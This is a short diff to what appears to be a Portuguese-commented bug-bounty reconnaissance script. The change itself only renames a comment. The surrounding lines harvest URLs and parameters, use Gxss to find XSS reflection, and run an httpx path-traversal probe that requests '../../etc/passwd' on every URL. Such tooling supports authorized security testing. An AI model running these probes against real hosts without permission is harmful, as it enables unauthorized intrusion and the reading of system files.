@@ -13,7 +13,7 @@ cat allUrls.txt | grep -i "\.js$" | tee jsfiles.txt;
 
 grep "=" allUrls.txt | tee allParams.txt; # Encontrar parametros que recebem algo
 cat allParams.txt | Gxss -c 100 -o reflected.txt; # Encontrar parametros que refletem caracteres para xss
-httpx -l allUrls.txt -path "/////////////../../../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt; # Validar LFI
+httpx -l allUrls.txt -path "/////////////../../../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt; # Validar Path Transversal
 
 
 #httpx -l allUrls.txt -mc 403 | tee 403s.txt; # Encontrar arquivos/direorios que nao temos acesso para tentar bypass
